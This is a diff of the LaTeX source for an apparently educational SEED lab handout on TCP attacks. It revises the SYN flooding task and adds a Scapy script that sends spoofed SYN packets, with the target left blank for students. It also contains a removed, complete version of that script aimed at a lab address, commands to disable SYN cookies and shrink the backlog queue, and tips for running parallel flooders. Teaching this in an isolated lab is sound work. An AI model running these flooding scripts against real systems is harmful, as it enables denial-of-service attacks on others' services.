@@ -175,16 +175,12 @@ We have already created an account called \texttt{seed} inside all
 the containers.
 Its password is \texttt{dees}. You can telnet into this account.  
 
+
+
 % *******************************************
 % SECTION
-% ******************************************* 
-\section{Lab Tasks}
-
-
-% -------------------------------------------
-% SUBSECTION
-% ------------------------------------------- 
-\subsection {Task 1: SYN Flooding Attack}
+% *******************************************
+\section{Task 1: SYN Flooding Attack}
 
 
 \begin{figure}[htb]
@@ -208,35 +204,39 @@ the victim cannot take any more connection. Figure~\ref{tcp:fig:synflooding}
 illustrates the attack.
 
 The size of the queue has a system-wide setting.  In Ubuntu OSes, we can check the
-setting using the following command: 
+setting using the following command. The OS sets this value based on
+the amount of the memory the system has: the more memory the machine has, 
+the larger this value will be.
 
 \begin{lstlisting}
-# sysctl -q net.ipv4.tcp_max_syn_backlog
+# sysctl net.ipv4.tcp_max_syn_backlog
 net.ipv4.tcp_max_syn_backlog = 128
 \end{lstlisting}
 
 We can use command \texttt{"netstat -nat"} to check the usage of the queue, 
 i.e., the number of half-opened connection associated with a listening port. 
 The state for such connections is \texttt {SYN-RECV}. If the 3-way handshake
-is finished, the state of the connections will be {\tt ESTABLISHED}.
-
+is finished, the state of the connections will be {\tt ESTABLISHED}. 
 
 \paragraph{SYN Cookie Countermeasure:}
 By default, Ubuntu's SYN flooding countermeasure is turned on. This 
 mechanism is called SYN cookie. It will kick in if the machine
-detects that it is under the SYN flooding attack.
-We can use the {\tt sysctl} command to turn on/off the SYN 
-cookie mechanism:
+detects that it is under the SYN flooding attack. In our 
+victim server container, we have already turned it off (see the 
+\texttt{sysctls} entry in the \texttt{docker-compose.yml} file).  
+We can use the following \texttt{sysctl} command to turn it on and off:
 
 \begin{lstlisting}
-$ sudo sysctl -a | grep syncookies     (Display the SYN cookie flag) 
-$ sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
-$ sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
+# sysctl -a | grep syncookies     (Display the SYN cookie flag) 
+# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
+# sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
 \end{lstlisting}
 
-The commands above only work inside the VM.  
-Inside the provided container, we will not be able to change 
-the SYN cookie flag. If we run the command, 
+To be able to use \texttt{sysctl} to change the system variables 
+inside a container, the container needs to be 
+configured with the \texttt{"privileged: true"} entry (which is the 
+case for our victim server). 
+Without this setting, if we run the above command,
 we will see the following error message. The container
 is not given the privilege to make the change. 
 
@@ -245,40 +245,100 @@ is not given the privilege to make the change.
 sysctl: setting key "net.ipv4.tcp_syncookies": Read-only file system
 \end{lstlisting}
 
-If we want to turn off the SYN cookie in a container, 
-we have to do it when we build the container. 
-That is why we added the following entry
-to the \texttt{docker-compose.yml} file:  
+
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Task 1.1: Launching the Attack Using Python}
+
+We provide a Python program called \texttt{synflood.py}, but
+we have intentionally left out some essential data in the code. 
+This code sends out spoofed TCP SYN packets, with 
+randomly generated source IP address, source port, and sequence number.
+Students should finish the code and then use it to 
+launch the attack on the target machine:
 
 \begin{lstlisting}
-sysctls:
-      - net.ipv4.tcp_syncookies=0
+#!/bin/env python3
+  
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+
+ip  = IP(dst="*.*.*.*")
+tcp = TCP(dport=**, flags='S')
+pkt = ip/tcp
+
+while True:
+    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # source iP
+    pkt[TCP].sport = getrandbits(16)     # source port
+    pkt[TCP].seq   = getrandbits(32)     # sequence number
+    send(pkt, verbose = 0)
 \end{lstlisting}
 
- 
+Let the attack run for at least one minute, then try to telnet 
+into the victim machine, and see whether you can succeed. Very likely that
+your attack will fail. Multiple issues can contribute to the failure 
+of the attack. They are listed in the following with guidelines 
+on how to address them. 
 
+\begin{itemize}
+  \item \textbf{TCP cache issue:} See Note A below.
 
-\paragraph{Launching the attack.}
-We provide a C program called \texttt{synflood.c}. Students can compile
-the program on the VM and then launch the attack on the target machine:
+  \item \textbf{VirtualBox issue:} If you are doing the attack from one VM against another VM, 
+    instead of using our container setup, please see Note B below. This is not an issue
+    if you are doing the attack using the container setup.
+
+  \item \textbf{TCP retransmission issue:} 
+    After sending out the SYN+ACK packet, the victim machine will wait for 
+    the ACK packet. If it does not come in time, TCP will retransmit the SYN+ACK packet. 
+    How many times it will retransmit depends on the following kernel parameters (by default,
+    its value is 5):
+    
+\begin{lstlisting}
+# sysctl net.ipv4.tcp_synack_retries
+net.ipv4.tcp_synack_retries = 5
+\end{lstlisting}
+
+    After these 5 retransmissions, TCP will remove the corresponding item
+    from the half-open connection queue. Every time when an item is removed,
+    a slot becomes open. Your attack packets and the legitimate 
+    telnet connection request packets will fight for this opening.
+    Our Python program may not be fast enough, and can thus lose to 
+    the legitimate telnet packet. To win the competition, we can run multiple instances
+    of the attack program in parallel. Please try this approach and 
+    see whether the success rate can be improved. How many instances 
+    should you run to achieve a reasonable success rate? 
+
+  \item \textbf{The size of the queue:}  
+    How many half-open connections can be stored in the queue
+    can affect the success rate of the attack. 
+    The size of the queue be adjusted using the following command:
 
 \begin{lstlisting}
-// Compile the code on the host VM
-$ gcc -o synflood synflood.c
-
-// Launch the attack from the attacker container
-# synflood 10.9.0.5 23
+# sysctl -w net.ipv4.tcp_max_syn_backlog=80
 \end{lstlisting}
- 
+     
+    While the attack is ongoing, you can run one of the following commands 
+    on the victim container to see
+    how many items are in the queue. It should be noted that one fourth of the 
+    space in the queue is reserved for ``proven destinations'' (see Note A below), 
+    so if we set the size to 80, its actual capacity is about 60. 
 
-While the attack is going on, 
-run the \texttt{"netstat -nat"} command on the victim machine, and compare 
-the result with that before the attack. 
-Please go to another machine, try to telnet to the target machine, 
-and describe your observation.
+\begin{lstlisting}
+$ netstat -tna | grep SYN_RECV | wc -l
+$ ss -n state syn-recv sport = :23 | wc -l
+\end{lstlisting}
+
+    Please reduce the size of the half-open connection queue on the 
+    victim server, and see whether your success rate can improve. 
+\end{itemize}
 
 
-\paragraph{An interesting observation.} On Ubuntu 20.04, if machine X
+\paragraph{Note A: A kernel mitigation mechanism.} On Ubuntu 20.04, if machine X
 has never made a TCP connection to the victim machine, when the SYN flooding 
 attack is launched, machine X will not be able to telnet into the 
 victim machine. However, if before the attack, machine X
@@ -288,18 +348,13 @@ successfully telnet to the victim machine during the attack.
 It seems that the victim machine remembers past successful 
 connections, and uses this memory when establishing
 future connections with the ``returning'' client. 
-This behavior does not exist in Ubuntu 16.04 
-and earlier versions. Some users of the SEED labs
-reported that the memory lasts less than 3 hours, i.e.,
-if you keep doing the attack for 3 hours, the attack
-will eventually be successful.
-
+This behavior does not exist in Ubuntu 16.04 and earlier versions.
 
 This is due to a mitigation of the kernel: 
-TCP reserves 1/4 of the backlog for ``proven destinations'' 
+TCP reserves one fourth of the backlog queue for ``proven destinations'' 
 if SYN Cookies are disabled. After making a TCP connection
 from \texttt{10.9.0.6} to the server \texttt{10.9.0.5}, we can 
-see that the IP address \texttt{10.9.0.6} is remembered
+see that the IP address \texttt{10.9.0.6} is remembered (cached)
 by the server, so they will be using the reserved slots
 when connections come from them, and will thus not be 
 affected by the SYN flooding attack.
@@ -313,46 +368,22 @@ the server.
 
 # ip tcp_metrics flush
 \end{lstlisting}
- 
 
 
-\paragraph{Enable the SYN Cookie Countermeasure.}
-Please enable the SYN cookie mechanism, and 
-run your attacks again, and compare the results. 
-
-
-
-\paragraph{Note on using Python + Scapy code:} 
-Although theoretically, we can use Python and Scapy to implement this attack,
-and the code will be much simplified. See the code below. 
-
-\begin{lstlisting}
-from scapy.all import IP, TCP, send
-from ipaddress import IPv4Address
-from random import getrandbits
-
-a = IP(dst="10.9.0.5")
-b = TCP(sport=1551, dport=23, seq=1551, flags='S')
-pkt = a/b
-
-while True:
-    pkt['IP'].src = str(IPv4Address(getrandbits(32)))
-    send(pkt, verbose = 0)
-\end{lstlisting}
-
-
-However, the attack will not succeed using our lab setup. We now understand
-the reason, but haven't found a good solution yet. The problem is caused by
-the NAT setup in our lab environment. If the victim machine is not 
-behind a NAT server, then this code will work.
-
+\paragraph{Note B: RST packets.} 
+If you are doing this task using two VMs, i.e., launching the attack from one VM
+against another VM, instead of attacking a container, from the Wireshark,
+you will notice many RST packets (reset). Initially, we thought that 
+the packets were generated from the recipient of the SYN+ACK packet, 
+but it turns out they are generated by the 
+NAT server in our setup. 
 
 Any traffic going out of the VM in our lab setup will go through the NAT server
 provided by VirtualBox. For TCP, NAT creates address translation 
 entries based on the SYN packet. 
 In our attack, the SYN packets generated 
 by the attacker did not go through the NAT (both attacker and victims are behind the 
-NAT), so no NAT entry was created. When the victim sends SYN + ACK back to the
+NAT), so no NAT entry was created. When the victim sends SYN+ACK packet back to the
 source IP (which is randomly generated by the attacker), this packet will 
 go out through the NAT, but because there is no prior NAT entry
 for this TCP connection, NAT does not know what to do,
@@ -362,14 +393,50 @@ RST packets cause the victim to remove the data from the half-open connection
 queue. Therefore, while we are trying fill up this queue with the attack, 
 VirtualBox helps the victim to remove our records from the queue. 
 It becomes a competition between our code and the VirtualBox. 
-Unfortunately, the speed of Python is not enough, so VirtualBox always win.
-C is much faster; that is why our C code will always win the competition. 
 
 
 % -------------------------------------------
 % SUBSECTION
-% ------------------------------------------- 
-\subsection {Task 2: TCP RST Attacks on \texttt{telnet} Connections}
+% -------------------------------------------
+\subsection{Task 1.2: Launch the Attack Using C} 
+
+Other than the TCP cache issue, all the issues mentioned in Task 1.1 
+can be resolved if we can send spoofed SYN packets fast enough. We
+can achieve that using C. We provide a C program called \texttt{synflood.c}
+in the lab setup. Please compile
+the program on the VM and then launch the attack on the target machine.
+
+\begin{lstlisting}
+// Compile the code on the host VM
+$ gcc -o synflood synflood.c
+
+// Launch the attack from the attacker container
+# synflood 10.9.0.5 23
+\end{lstlisting}
+
+
+Before launching the attack, please restore the queue size to its 
+original value. Please compare the results with the one 
+using the Python program, and explain the reason behind the difference. 
+
+ 
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Task 1.3: Enable the SYN Cookie Countermeasure}
+
+Please enable the SYN cookie mechanism, and 
+run your attacks again, and compare the results. 
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section {Task 2: TCP RST Attacks on \texttt{telnet} Connections}
 
 The TCP RST Attack can terminate an established TCP connection between
 two victims. For example, if there is an established \telnet connection (TCP)
@@ -466,10 +533,11 @@ not at the content server machine (which does not belong to you).
 
             
 
-% -------------------------------------------
-% SUBSECTION
-% ------------------------------------------- 
-\subsection{Task 3: TCP Session Hijacking}
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 3: TCP Session Hijacking}
 
 
 
@@ -528,10 +596,11 @@ set the \texttt{iface} argument.
 
 
 
-% -------------------------------------------
-% SUBSECTION
-% ------------------------------------------- 
-\subsection{Task 4: Creating Reverse Shell using TCP Session Hijacking}
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 4: Creating Reverse Shell using TCP Session Hijacking}
 
 When attackers are able to inject a command to the victim's machine using
 TCP session hijacking, they are not interested in running one simple
@@ -632,11 +701,20 @@ shell on the target server.
 % *******************************************
 % SECTION
 % ******************************************* 
-\section{Lab Report}
+\section{Submission}
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \input{\commonfolder/submission}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section*{Acknowledgment}
+
+I would like to thank CSender (GitHub ID), Eric Dong, and Chao Gong,
+for their suggestions on improving the SYN flooding attack
+task in this lab. 
 
 
 \end{document}
